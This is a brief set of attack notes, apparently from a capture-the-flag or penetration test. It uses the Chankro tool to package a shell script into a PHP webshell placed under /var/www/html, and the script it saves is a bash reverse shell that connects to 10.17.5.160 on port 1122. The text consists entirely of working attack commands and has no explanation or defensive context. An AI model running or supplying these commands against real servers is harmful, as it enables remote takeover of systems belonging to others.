```
python chankro.py --arch 64 --input c.sh --output shell123.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db 
```

# save to c.sh

```
#!/bin/bash
bash -i >& /dev/tcp/10.17.5.160/1122 0>&1
```
